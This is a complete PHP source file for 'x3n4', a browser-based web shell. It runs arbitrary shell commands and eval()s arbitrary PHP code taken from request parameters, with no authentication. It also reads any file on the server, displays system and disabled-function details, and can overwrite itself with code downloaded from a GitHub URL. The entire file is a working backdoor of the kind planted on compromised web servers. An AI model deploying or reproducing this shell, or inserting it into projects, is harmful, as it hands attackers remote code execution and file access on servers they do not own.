<?php

define('X3N4_VERSION', 'v0.1.42-alpha');

session_start();

/**
 * Functions
 */
function get_shell_prefix()
{
    return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
}
function get_shell_command()
{
    static $shell_command;

    if ($shell_command === null) {
        if (is_callable('system') && !is_function_disabled('system')) {
            $shell_command = 'system';
        } elseif (is_callable('shell_exec') && !is_function_disabled('shell_exec')) {
            $shell_command = 'shell_exec';
        } elseif (is_callable('exec') && !is_function_disabled('exec')) {
            $shell_command = 'exec';
        } elseif (is_callable('passthru') && !is_function_disabled('passthru')) {
            $shell_command = 'passthru';
        } elseif (is_callable('proc_open') && !is_function_disabled('proc_open')) {
            $shell_command = 'proc_open';
        } elseif (is_callable('popen') && !is_function_disabled('popen')) {
            $shell_command = 'popen';
        } else {
            $shell_command = false;
        }
    }

    return $shell_command;
}
function execute_command($command)
{
    switch (get_shell_command()) {
        case 'system':
            ob_start();
            @system($command);
            $return = ob_get_contents();
            ob_end_clean();
            return $return;

        case 'shell_exec':
            return @shell_exec($command);

        case 'exec':
            return @exec($command);

        default:
            return 'None available function to run your command, sorry. :(';
    }
}
function disabled_functions()
{
    static $disabled_fn;

    if ($disabled_fn === null) {
        $df = ini_get('disable_functions');
        $shfb = ini_get('suhosin.executor.func.blacklist');
        $fn_list = array_map('trim', explode(',', "$df,$shfb"));
        $disabled_fn = array_filter($fn_list, create_function('$value', 'return $value !== "";'));
    }

    return $disabled_fn;
}
function is_function_disabled($function)
{
    return in_array($function, disabled_functions());
}
function auto_update()
{
    $options  = array('http' => array('user_agent' => 'custom user agent string'));
    $context  = stream_context_create($options);
    file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
    file_put_contents(__FILE__, file_get_contents('https://raw.githubusercontent.com/jorge-matricali/x3n4/master/x3n4.php', false, $context));
}
function tree($dir)
{
    $ffs = scandir($dir);

    unset($ffs[array_search('.', $ffs, true)]);
    unset($ffs[array_search('..', $ffs, true)]);

    // prevent empty ordered elements
    if (count($ffs) < 1) {
        return;
    }

    echo '<ol>';
    foreach ($ffs as $ff) {
        echo '<li>', $ff;
        if (is_dir($dir.'/'.$ff)) {
            tree($dir.'/'.$ff);
        }
        echo '</li>';
    }
    echo '</ol>';
}
function list_folder_files($dir)
{
    $files = scandir($dir);
    $data = array();
    foreach ($files as $file) {
        $fpath = $dir . DIRECTORY_SEPARATOR . $file;
        array_push($data, array(
            'filename' => $file,
            'type' => is_dir($fpath) ? 'folder' : 'file',
            'fullpath' => realpath($fpath),
        ));
    }
    return $data;
}
function output_json($output = '')
{
    $output_data = array(
        'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
        'banner' => get_shell_prefix(),
    );
    if (is_array($output)) {
        $output_data = array_merge($output_data, $output);
    } else {
        $output_data['stdout'] = $output;
    }
    if (is_callable('json_encode')) {
        header('Content-Type: application/json;');
        echo json_encode($output_data);
    } else {
        echo $output_data['banner'], ' ', $_REQUEST['cmd'], PHP_EOL, $output;
    }
    session_write_close();
    exit(0);
}

/**
 * CORE
 */
if (!empty($_SESSION['pwd'])) {
    chdir($_SESSION['pwd']);
}

if (isset($_REQUEST['cmd'])) {
    $REQUESTED_CMD = trim($_REQUEST['cmd']);
    if (empty($REQUESTED_CMD)) {
        exit(0);
    }
    if ($REQUESTED_CMD == 'dirl') {
        output_json(list_folder_files('.'));
    }
    if ($REQUESTED_CMD == 'upgrade') {
        auto_update();
        output_json('--- PLEASE REFRESH YOUR BROWSER :D ---');
        exit(0);
    }
    if ($REQUESTED_CMD == 'exit') {
        session_destroy();
        exit(0);
    }
    if (substr($_REQUEST['cmd'], 0, 3) === 'cd ') {
        $dir = substr($_REQUEST['cmd'], 3);
        $dir = realpath($dir);
        if (chdir($dir)) {
            $_SESSION['pwd'] = $dir;
            output_json();
        }
    }

    $output = execute_command($_REQUEST['cmd'] . ' 2>&1');
    output_json($output);
}

if (isset($_REQUEST['eval'])) {
    $t1 = microtime(true);
    ob_start();
    $output = @eval(stripslashes($_REQUEST['eval']));
    $output .= ob_get_contents();
    ob_end_clean();
    $t2 = microtime(true);
    output_json(array(
        'stdout' => $output,
        'took' => round($t2 - $t1, 2),
    ));
}

/**
 * File Manager
 */
if (isset($_REQUEST['dir'])) {
    $t1 = microtime(true);
    $directory = realpath(trim($_REQUEST['dir']));
    $output = list_folder_files($directory);
    $t2 = microtime(true);
    output_json(array(
        'path' => $directory,
        'files' => $output,
        'took' => round($t2 - $t1, 2),
    ));
}
if (isset($_REQUEST['file'])) {
    $t1 = microtime(true);
    $filepath = realpath(trim($_REQUEST['file']));
    $output = file_get_contents($filepath);
    $t2 = microtime(true);
    output_json(array(
        'path' => $filepath,
        'content' => $output,
        'took' => round($t2 - $t1, 2),
    ));
}

/**
 * HTML
 */
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>x3n4 <?php echo X3N4_VERSION; ?></title>

    <!-- Bootstrap -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    #stdout {
        max-height: 650px;
        background: #2F3129;
        color: #8F908A;
    }
    #php-code,
    .ace_editor,
    .ace_text-input {
        min-height: 200px;
    }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="page-header">
            <span class="pull-right label label-<?php echo ini_get('safe_mode') ? 'success' : 'danger'; ?>">safe_mode <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?></span>
            x3n4 <?php echo X3N4_VERSION; ?>
        </h1>

        <ul class="nav nav-tabs" role="tablist">
            <li role="presentation"><a href="#information" aria-controls="information" role="tab" data-toggle="tab"><i class="fa fa-info-circle"></i> System information</a></li>
            <li role="presentation" class="active"><a href="#console" aria-controls="console" role="tab" data-toggle="tab"><i class="fa fa-terminal"></i> Console</a></li>
            <li role="presentation"><a href="#file-manager" aria-controls="file-manager" role="tab" data-toggle="tab"><i class="fa fa-file-code-o"></i> File manager</a></li>
            <li role="presentation"><a href="#php-eval" aria-controls="php-eval" role="tab" data-toggle="tab"><i class="fa fa-code"></i> eval()</a></li>
        </ul>
        <p></p>
        <div class="tab-content">
            <div id="information" role="tabpanel" class="tab-pane table-responsive">
                <table class="table">
                    <tr>
                        <td>System:</td>
                        <td>
                            <?php
                            switch (PHP_OS) {
                                case 'Linux':
                                    $platform_icon = 'fa-linux';
                                    break;
                                case 'WINNT':
                                    $platform_icon = 'fa-windows';
                                    break;
                                case 'Darwin':
                                    $platform_icon = 'fa-osx';
                                    break;
                                default:
                                    $platform_icon = 'fa-unknown';
                            }
                            ?>
                            <i class="fa <?php echo $platform_icon; ?>"></i> <?php echo php_uname(); ?>
                        </td>
                    </tr>
                    <tr>
                        <td>Current user:</td>
                        <td><?php echo get_current_user(); ?></td>
                    </tr>
                    <tr>
                        <td>Server IP:</td>
                        <td><?php echo $_SERVER['SERVER_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>Client IP:</td>
                        <td><?php echo $_SERVER['REMOTE_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>PHP Version:</td>
                        <td><?php echo phpversion(); ?></td>
                    </tr>
                    <tr>
                        <td>Installed modules:</td>
                        <td><?php echo implode(', ', get_loaded_extensions()); ?></td>
                    </tr>
                    <tr>
                        <td>Disabled functions:</td>
                        <td><?php echo implode(', ', disabled_functions()); ?></td>
                    </tr>
                    <tr>
                        <td>Shell function:</td>
                        <td><?php echo get_shell_command(); ?></td>
                </table>
            </div>

            <div id="console" role="tabpanel" class="tab-pane active">
                <pre id="stdout"><?php echo execute_command('cat /etc/motd') . PHP_EOL; ?></pre>
                <div class="form-group">
                    <div class="input-group">
                        <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
                        <input type="text" id="stdin" class="form-control" />
                        <span class="input-group-btn">
                            <button type="button" class="btn btn-default" id="btnExecCommand"><i class="fa fa-chevron-right"></i> Send</button>
                        </span>
                    </div>
                </div>
            </div>

            <div id="file-manager" role="tabpanel" class="tab-pane">
            </div>

            <div id="php-eval" role="tabpanel" class="tab-pane">
                <textarea id="php-code" class="form-control"><?php echo "// ?><?php // place your code here
echo 'hello world';"; ?></textarea>
                <p class="clearfix">
                    <button type="button" class="btn btn-default pull-right" id="btnEval"><i class="fa fa-play"></i> Run</button>
                    <span id="eval-time-took"></span>
                </p>
                <pre id="php-stdout"></pre>
            </div>
        </div>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.2.8/ace.js"></script>
    <script>
        window.editorPhp = ace.edit('php-code');
        window.editorPhp.setTheme('ace/theme/monokai');
        window.editorPhp.getSession().setMode('ace/mode/php');
        window.editorPhp.getSession().setUseWrapMode(true);
        window.editorPhp.resize(true);
    </script>

    <script>
        function x3n4 () {
            this.version = '<?php echo X3N4_VERSION; ?>';
            this.script_path = '<?php echo $_SERVER['REQUEST_URI']; ?>';
            this.directory_separator = '<?php echo DIRECTORY_SEPARATOR; ?>';
            this.execCommand = function(command) {
                if (command.trim() == 'clear') {
                    $('#stdout').html('');
                    return;
                }
                $.post(this.script_path, {cmd: command}, function(data) {
                    console.log(data);
                    if (data.stdout) {
                        $('#stdout').append(data.banner + " " + command + "\n");
                        if (data.stdout !== null) {
                            $('#stdout').append(data.stdout);
                        }
                        $('#pwd').html(data.banner);
                    } else {
                        $('#stdout').append(data);
                    }
                    $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                });
            }
            this.evalPhp = function(code) {
                var evalt1 = Date.now();
                $.post(this.script_path, {eval: code}, function(data) {
                    var evaltime = Date.now() - evalt1;
                    console.log(data);
                    if (data.stdout) {
                        $('#php-stdout').html(data.stdout);
                    } else {
                        $('#php-stdout').html(data);
                    }
                    if (data.took !== undefined) {
                        $('#eval-time-took').html('Request time: ' + evaltime + 'ms. PHP process time: ' + data.took + 'ms.');
                    } else {
                        $('#eval-time-took').html('Request time: ' + evaltime + 'ms.');
                    }
                });
            }
            this.clickExecCommand = function () {
                window.x3n4.execCommand($('#stdin').val());
                $('#stdin').val('');
            }
            this.clickEval = function () {
                var code = '';
                if (window.editorPhp) {
                    code = window.editorPhp.getValue();
                } else {
                    code = $('#php-code').val();
                }
                if (code !== undefined) {
                    window.x3n4.evalPhp(code);
                }
            }
            this.checkUpdate = function () {
                $.get('https://api.github.com/repos/jorge-matricali/x3n4/releases', function(data) {
                    if (window.x3n4.version !== data[0].tag_name) {
                        $('#stdout').append('/!\\ x3n4 ' + data[0].tag_name + " available. Type 'upgrade' to download the latest version automatically.\n");
                        $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                    }
                });
            }
            this.declareCallbacks = function () {
                $('#btnExecCommand').on('click', this.clickExecCommand);
                $('#btnEval').on('click', this.clickEval);
                $('#stdin').on('keypress', function (ev) {
                    if ((ev.keyCode ? ev.keyCode : ev.which) == '13') {
                        $('#btnExecCommand').click()
                    }
                });
                $('a[href="#console"]').on('click', function (ev) {
                    window.setTimeout(function(){ $('#stdin').focus() }, 200);
                })

                $('a[data-fullpath]').on('click', function (ev) {
                    console.log(ev);
                    // window.x3n4.fileManagerGetDirectory(ev.data('fullpath'))
                })
            }

            this.escapeHtml = function (text) {
                'use strict';
                return text.replace(/[\"&<>]/g, function (a) {
                    return { '"': '&quot;', '&': '&amp;', '<': '&lt;', '>': '&gt;' }[a];
                });
            }

            this.fileManagerPathLinks = function (path) {
                var html = ''
                var cpath = ''
                $.each(path.split(window.x3n4.directory_separator), function (i, el) {
                    if (el == '') return
                    cpath += window.x3n4.directory_separator + el
                    html += window.x3n4.directory_separator + '<a href="#file-manager" onclick="window.x3n4.fileManagerGetDirectory(\'' + cpath + '\')" title="' + cpath + '">'+ el +'</a>'
                })
                return html;
            }

            this.fileManagerGetDirectory = function (path) {
                $.get(this.script_path + '?dir=' + path, function(data) {
                    window.x3n4.fileManagerRenderDirectory(data)
                });
            }

            this.fileManagerGetFile = function (path) {
                $('#file-manager').html('<p><i class="fa fa-chevron-right"></i> ' + window.x3n4.fileManagerPathLinks(path) + '</p>')
                $.get(this.script_path + '?file=' + path, function(data) {
                    // html += '<pre>' + window.x3n4.escapeHtml(data.content) + '</pre>';
                    $('#file-manager').append($('<pre>' + data.content + '</pre>'))
                    // $('#file-manager').html('<pre>' + data.content + '</pre>')
                });
                // $('#file-manager').html(html)
            }

            this.fileManagerRenderDirectory = function (data) {
                var html = '<p><i class="fa fa-chevron-right"></i> ' + window.x3n4.fileManagerPathLinks(data.path) + '</p>'
                html += '<ul class="list-group"><li class="list-group-item">..</li>';
                if (data.files) {
                    $.each(data.files, function (i, el) {
                        if (el.filename !== '.' && el.filename !== '..') {
                            html += '<li class="list-group-item"><span class="col-sm-4">';
                            if (el.type == 'folder') {
                                html += '<i class="glyphicon glyphicon-folder-close"></i> '
                                html += '<a href="#file-manager" onclick="window.x3n4.fileManagerGetDirectory(\'' + el.fullpath + '\')" title="' + el.filename + '">'+ el.filename +'</a>'
                            } else {
                                html += '<i class="glyphicon glyphicon-file"></i> '
                                html += '<a href="#file-manager" onclick="window.x3n4.fileManagerGetFile(\'' + el.fullpath + '\')" title="' + el.filename + '">'+ el.filename +'</a>'
                            }

                            html += '</span><!--span class="col-sm-2"-->'
                            // ---
                            html += '<span class="clearfix"></span>';
                            html += '</li>';
                        }
                    })
                }
                html += '</ul>';
                $('#file-manager').html(html);
            }
        }
        window.x3n4 = new x3n4();
        window.x3n4.declareCallbacks();
        window.x3n4.checkUpdate();
    </script>
</body>
</html>
